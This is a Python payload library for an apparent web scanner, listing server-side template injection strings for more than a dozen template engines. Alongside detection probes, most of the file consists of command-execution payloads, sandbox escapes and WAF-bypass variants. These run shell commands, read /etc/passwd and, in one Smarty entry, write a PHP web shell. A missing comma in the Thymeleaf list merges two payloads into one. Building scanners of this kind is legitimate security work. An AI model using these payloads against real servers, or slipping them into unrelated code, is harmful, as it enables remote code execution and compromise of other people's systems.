"""
SSTI (Server-Side Template Injection) Payloads.
Organized by template engine for precise fingerprinting and exploitation detection.
"""

# ── Generic Detection (engine-agnostic math probes) ──────────────────────────
GENERIC_DETECTION = [
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    '<%= 7*7 %>',
    '{7*7}',
    '{{7*\'7\'}}',        # Jinja2 returns '7777777', Twig returns '49'
    '{{dump(7*7)}}',
    '${7*7}',
    '@(7*7)',              # Razor
    '#{7*7}',              # Ruby ERB / Java EL
    '#set($x=7*7)${x}',   # Velocity
]

# ── Jinja2 / Python (Flask, Django templates) ────────────────────────────────
JINJA2_PAYLOADS = [
    '{{7*7}}',
    "{{7*'7'}}",           # → '7777777' confirms Jinja2
    '{{config}}',
    '{{config.items()}}',
    '{{self.__class__.__mro__}}',
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    '{{request.environ}}',
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{range.__init__.__globals__['os'].popen('id').read()}}",
    '{{request|attr("application")|attr("\\x5f\\x5fglobals\\x5f\\x5f")}}',
]

# Expected detection patterns for Jinja2
JINJA2_INDICATORS = {
    '{{7*7}}': '49',
    "{{7*'7'}}": '7777777',
    '{{config}}': '<Config',
}

# ── Twig (PHP) ───────────────────────────────────────────────────────────────
TWIG_PAYLOADS = [
    '{{7*7}}',
    "{{7*'7'}}",           # → '49' in Twig (vs '7777777' in Jinja2)
    '{{_self.env.display("id")}}',
    '{{_self.env.getFilter("id")}}',
    '{{["id"]|filter("system")}}',
    '{{["id"]|map("system")}}',
    "{{['cat /etc/passwd']|filter('system')}}",
    '{{app.request.server.all|join(",")}}',
    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
    '{{dump(app)}}',
]

TWIG_INDICATORS = {
    '{{7*7}}': '49',
    "{{7*'7'}}": '49',
}

# ── Freemarker (Java) ────────────────────────────────────────────────────────
FREEMARKER_PAYLOADS = [
    '${7*7}',
    '${7*7?c}',
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    '${object.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}',
    '${.now}',
    '${.version}',
    '[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}',
    '<#assign classloader=object.class.protectionDomain.classLoader>',
    '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("id")}',
]

FREEMARKER_INDICATORS = {
    '${7*7}': '49',
}

# ── Pebble (Java) ────────────────────────────────────────────────────────────
PEBBLE_PAYLOADS = [
    '{{7*7}}',
    "{% set cmd = 'id' %}",
    '{{ ["id"]|join }}',
    '{% set cmd = "id" %}{{ cmd }}',
]

# ── Mako (Python) ────────────────────────────────────────────────────────────
MAKO_PAYLOADS = [
    '${7*7}',
    '${self.module.cache.util.os.popen("id").read()}',
    '<%import os%>${os.popen("id").read()}',
    '${self.template.module.__builtins__}',
]

MAKO_INDICATORS = {
    '${7*7}': '49',
}

# ── Velocity (Java) ─────────────────────────────────────────────────────────
VELOCITY_PAYLOADS = [
    '#set($x=7*7)${x}',
    '#set($str=$class.inspect("java.lang.String").type)',
    '#set($chr=$class.inspect("java.lang.Character").type)',
    '#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))',
]

VELOCITY_INDICATORS = {
    '#set($x=7*7)${x}': '49',
}

# ── Smarty (PHP) ─────────────────────────────────────────────────────────────
SMARTY_PAYLOADS = [
    '{7*7}',
    '{php}echo `id`;{/php}',
    '{system("id")}',
    '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[\'cmd\']); ?>",self::clearConfig())}',
]

# ── ERB (Ruby) ───────────────────────────────────────────────────────────────
ERB_PAYLOADS = [
    '<%= 7*7 %>',
    '<%= system("id") %>',
    '<%= `id` %>',
    '<%= IO.popen("id").read %>',
]

ERB_INDICATORS = {
    '<%= 7*7 %>': '49',
}

# ── Handlebars (JavaScript) ─────────────────────────────────────────────────
HANDLEBARS_PAYLOADS = [
    '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
    '{{#with (lookup this "constructor")}}{{#with (call this "return process")}}{{this.mainModule.require("child_process").execSync("id")}}{{/with}}{{/with}}',
]

# ── EJS (Embedded JavaScript / Node.js) ──────────────────────────────────────
EJS_PAYLOADS = [
    '<%= 7*7 %>',
    '<%= process.env %>',
    '<%= global.process.mainModule.require("child_process").execSync("id") %>',
    '<%- include("/etc/passwd") %>',
    '<%= this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString() %>',
    '<%= global.process.mainModule.constructor._resolveFilename("os").__proto__ %>',
]

EJS_INDICATORS = {
    '<%= 7*7 %>': '49',
}

# ── Pug/Jade (Node.js) ──────────────────────────────────────────────────────
PUG_PAYLOADS = [
    '#{7*7}',
    '-var x = global.process.mainModule.require("child_process").execSync("id"); #{x}',
    '- var x = root.process; #{x}',
    '#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync("id").toString();return sh}()}',
]

PUG_INDICATORS = {
    '#{7*7}': '49',
}

# ── Nunjucks (JavaScript) ────────────────────────────────────────────────────
NUNJUCKS_PAYLOADS = [
    '{{7*7}}',
    '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
    '{{"".constructor.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
    '{{constructor.constructor("return this.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
]

# ── Thymeleaf (Java / Spring) ───────────────────────────────────────────────
THYMELEAF_PAYLOADS = [
    '__${7*7}__',
    '__${T(java.lang.Runtime).getRuntime().exec("id")}__',
    '*{T(java.lang.Runtime).getRuntime().exec("id")}',
    '__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__',
    '*{#strings.replace(#strings.toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})),"","")}'
    '${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}',
]

THYMELEAF_INDICATORS = {
    '__${7*7}__': '49',
}

# ── Razor (.NET) ─────────────────────────────────────────────────────────────
RAZOR_PAYLOADS = [
    '@(7*7)',
    '@{var x = 7*7;}@x',
    '@System.Diagnostics.Process.Start("cmd","/c whoami")',
    '@{System.IO.File.ReadAllText("/etc/passwd")}',
    '@Html.Raw("<script>alert(1)</script>")',
]

RAZOR_INDICATORS = {
    '@(7*7)': '49',
}

# ── Advanced Sandbox Escapes — Jinja2 ────────────────────────────────────────
JINJA2_SANDBOX_ESCAPES = [
    "{{().__class__.__bases__[0].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{request.__class__.__mro__[3].__subclasses__()}}",
    "{{g.pop.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{url_for.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    # Filter-based escapes
    "{{'id'|attr('__class__')}}",
    "{{['id'].__class__.__base__.__subclasses__()}}",
    "{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()}}",
    # Without quotes
    "{{lipsum.__globals__[request.args.a].popen(request.args.b).read()}}",
    # WAF bypass variants
    "{%set a='o'%}{%set b='s'%}{{lipsum.__globals__[a~b].popen('id').read()}}",
    "{{(lipsum|string|list)[10]}}",  # Extract chars from objects
]

# ── Advanced Sandbox Escapes — Twig ──────────────────────────────────────────
TWIG_SANDBOX_ESCAPES = [
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
    "{{['id']|filter('passthru')}}",
    "{{['id']|filter('exec')}}",
    "{{['cat /etc/passwd']|filter('system')}}",
    "{{_self.env.display('<?php system(\"id\"); ?>')}}",
    "{{dump(app)}}",
    "{{app.request.server.all|join(',')}}",
]

# ── Advanced — Freemarker Sandbox Escapes ────────────────────────────────────
FREEMARKER_SANDBOX_ESCAPES = [
    '<#assign classloader=object.class.protectionDomain.classLoader>'
    '<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>'
    '${owc.getField("DEFAULT_WRAPPER").get(null).newInstance(owc.getField("DEFAULT_WRAPPER").get(null).getStaticModels()["java.lang.ProcessBuilder"](["id"]),"start")}',
    '${objectConstructor("java.lang.ProcessBuilder", "id").start()}',
    '<#assign is=object.getClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id").getInputStream()><#assign br=objectConstructor("java.io.BufferedReader", objectConstructor("java.io.InputStreamReader", is))>${br.readLine()}',
]

# ── Polyglot Detection Payloads ──────────────────────────────────────────────
SSTI_POLYGLOTS = [
    '{{7*7}}${7*7}<%= 7*7 %>#{7*7}#set($x=7*7)${x}@(7*7)',
    'a]b{{7*\'7\'}}c${7*7}d<%= 7*7 %>',
    '{{constructor.constructor("return 7*7")()}}',
    '${7*7}#{7*7}{{7*7}}<%= 7*7 %>',
]

# ── Error-Based Detection ────────────────────────────────────────────────────
ERROR_BASED_SSTI = [
    '{{invalid_var_12345}}',
    '${invalid_var_12345}',
    '<%= invalid_var_12345 %>',
    '#{invalid_var_12345}',
    '{{7/0}}',
    '${7/0}',
    '<%= 7/0 %>',
    '{{{7*7}}}',  # Triple braces
    '{{7*"7"}}',
    '${7*"7"}',
]


def get_all_ssti_payloads() -> list:
    """Return all SSTI payloads combined."""
    return (
        GENERIC_DETECTION + JINJA2_PAYLOADS + TWIG_PAYLOADS +
        FREEMARKER_PAYLOADS + PEBBLE_PAYLOADS + MAKO_PAYLOADS +
        VELOCITY_PAYLOADS + SMARTY_PAYLOADS + ERB_PAYLOADS +
        HANDLEBARS_PAYLOADS + EJS_PAYLOADS + PUG_PAYLOADS +
        NUNJUCKS_PAYLOADS + THYMELEAF_PAYLOADS + RAZOR_PAYLOADS +
        JINJA2_SANDBOX_ESCAPES + TWIG_SANDBOX_ESCAPES +
        FREEMARKER_SANDBOX_ESCAPES + SSTI_POLYGLOTS + ERROR_BASED_SSTI
    )


def get_ssti_payloads_by_depth(depth: str) -> list:
    """Return depth-appropriate SSTI payloads."""
    if depth == 'shallow':
        return GENERIC_DETECTION[:5]
    elif depth == 'medium':
        return (GENERIC_DETECTION + JINJA2_PAYLOADS[:5] + TWIG_PAYLOADS[:3] +
                FREEMARKER_PAYLOADS[:3] + EJS_PAYLOADS[:3] + THYMELEAF_PAYLOADS[:3] +
                SSTI_POLYGLOTS)
    else:  # deep
        return get_all_ssti_payloads()


# All engine indicator maps for fingerprinting
ENGINE_INDICATORS = {
    'Jinja2': JINJA2_INDICATORS,
    'Twig': TWIG_INDICATORS,
    'Freemarker': FREEMARKER_INDICATORS,
    'Mako': MAKO_INDICATORS,
    'Velocity': VELOCITY_INDICATORS,
    'ERB': ERB_INDICATORS,
    'EJS': EJS_INDICATORS,
    'Pug': PUG_INDICATORS,
    'Thymeleaf': THYMELEAF_INDICATORS,
    'Razor': RAZOR_INDICATORS,
}
